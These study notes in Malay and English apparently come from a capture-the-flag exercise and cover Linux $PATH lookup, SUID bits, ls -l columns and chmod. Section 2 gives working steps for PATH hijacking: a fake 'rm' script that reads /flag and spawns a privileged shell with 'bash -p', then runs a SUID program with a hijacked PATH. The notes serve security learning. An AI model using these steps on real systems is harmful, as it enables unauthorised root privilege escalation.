# `$PATH` Hijacking, SUID & File Permissions — Quick Notes

## 1. Memahami `$PATH` & Cara Linux Cari Command
Setiap command seperti `ls`, `cat`, atau `rm` sebenarnya ialah compiled binary program yang duduk dalam folder seperti `/usr/bin/` atau `/bin/`.

* **`$PATH`**: List folder (dipisahkan dengan `:`) yang `bash` search dari **kiri ke kanan** bila kita taip bare command tanpa full path.
* **Explicit / Full Path:** Kalau program panggil full path (cth: `/usr/bin/rm`), Linux **tak akan** tengok `$PATH` langsung.

```bash
which ls                  # Check lokasi sebenar program ls (cth: /usr/bin/ls)
echo $PATH                # Print senarai folder dalam $PATH

PATH=""                   # Kosongkan $PATH (dalam current shell sahaja)
export PATH=""            # Kosongkan $PATH termasuk untuk child process
PATH=~/bin:$PATH          # Selit folder ~/bin di PALING DEPAN $PATH tanpa buang yang lama
```
*(Note: Jangan letak space dekat tanda `=` masa set variable dalam Bash!)*

---

## 2. *PATH Hijacking* Attack (Rampas Command Program SUID)
Bila program berkuasa `root` (SUID) panggil external command **tanpa full path** (cth: `rm` sahaja, bukan `/usr/bin/rm`) dan tak sanitize `$PATH`, normal user boleh tipu `root` untuk run fake script kita.

### Attack Flow (4 Steps)
1. **Create custom command folder sendiri:**
   ```bash
   mkdir -p ~/bin
   ```
2. **Tulis fake script guna nama target command (cth: `rm`):**
   ```bash
   # -e enable escape sequence supaya \n dibaca sebagai newline
   echo -e '#!/bin/bash\n/usr/bin/cat /flag\n/bin/bash -p' > ~/bin/rm
   ```
3. **Tambah *Execute* (`+x`) permission supaya Linux recognize sebagai program:**
   ```bash
   chmod +x ~/bin/rm
   ```
4. **Letak `~/bin` di depan `$PATH` dan run SUID target program:**
   ```bash
   PATH=~/bin:$PATH /challenge/run
   ```
   *(Sebab child process inherit identity parent process, script `~/bin/rm` kita akan run dengan full kuasa **`root`**!)*

---

## 3. Bedah 7 Kolum `ls -l`
Contoh output:
```text
-rwsr-xr-x   1    root      root      16384 Nov 19 07:33 run
  (1)       (2)    (3)       (4)        (5)        (6)      (7)
```

| Kolum | Nama | Maksud |
| :--- | :--- | :--- |
| **(1)** | **Type & Permissions** | Huruf 1 = file type (`-` file, `d` directory, `l` symlink, `p` FIFO pipe). Diikuti 3 set `rwx` untuk **Owner**, **Group**, dan **Others**. |
| **(2)** | **Hard Link Count** | Jumlah hard links yang point ke data file tu (`1` untuk normal file, `2+` untuk folder). |
| **(3)** | **Owner** | Pemilik individu file (tentukan kuasa siapa dipakai kalau SUID bit aktif). |
| **(4)** | **Group** | Kumpulan pemilik file (share access antara ahli group yang sama). |
| **(5)** | **Size** | Saiz file dalam *bytes*. |
| **(6)** | **Timestamp** | Tarikh dan masa terakhir file modified. |
| **(7)** | **Filename** | Nama file atau directory. |

---

## 4. SUID (`s`) & Flag `bash -p`
* **SUID (*Set User ID* — `-rwsr-xr-x`):** Huruf `s` gantikan `x` di slot *Owner*. Ia allow normal user run program tu dengan **pinjam identity/kuasa *Owner* asal file** (cth: `root`), bukan identity user yang run.
* **Kernel Protection:** Kalau isi SUID file di-modify (`write`), Linux kernel akan auto-drop bit `s` untuk security.
* **Kenapa Wajib Guna `/bin/bash -p`:** Secara default, `bash` akan drop inherited `root` privilege kalau real UID tak sama dengan effective UID. Flag **`-p` (*Privileged Mode*)** paksa `bash` kekalkan identity `root` (`EUID 0`) sampai buka interactive *root shell* (`#`).

---

## 5. `chmod` — Tukar File Permissions (Symbolic vs Octal)

### Basic Permission Values
* **`r` (*Read*)** = **`4`**
* **`w` (*Write*)** = **`2`**
* **`x` (*Execute*)** = **`1`**
* **`-` (*No Access*)** = **`0`**

### Cara 1: Symbolic Style (`u`, `g`, `o`, `+`, `-`, `=`)
* `u` = User (Owner), `g` = Group, `o` = Others, `a` = All

```bash
chmod +x ~/bin/rm          # Tambah execute (x) permission untuk semua
chmod u=r,go= flag         # Owner boleh read sahaja (r), Group & Others dibuang semua access
chmod u=rw,go= flag        # Owner boleh read & write (rw), Group & Others dibuang semua access
```

### Cara 2: Octal Number Style (3 Digit: `Owner` `Group` `Others`)
Campur nilai `4` (`r`), `2` (`w`), dan `1` (`x`) untuk setiap group:

| Code | Pecahan | Output `ls -l` | Kegunaan Biasa |
| :--- | :--- | :--- | :--- |
| **`755`** | `7` (`4+2+1`), `5` (`4+1`), `5` (`4+1`) | `-rwxr-xr-x` | Program / script yang semua orang boleh run. |
| **`700`** | `7` (`4+2+1`), `0`, `0` | `-rwx------` | Private program / script untuk owner sahaja. |
| **`644`** | `6` (`4+2`), `4`, `4` | `-rw-r--r--` | Normal text file (owner boleh edit, orang lain read-only). |
| **`600`** | `6` (`4+2`), `0`, `0` | `-rw-------` | Secret file (hanya owner boleh read & edit). |
| **`400`** | `4`, `0`, `0` | `-r--------` | File `/flag` (hanya `root` boleh read; normal user kena `Permission denied`). |

```bash
chmod 755 ~/bin/rm         # Sama je macam chmod +x ~/bin/rm
chmod 400 flag             # Lock file supaya owner (root) sahaja boleh baca
```
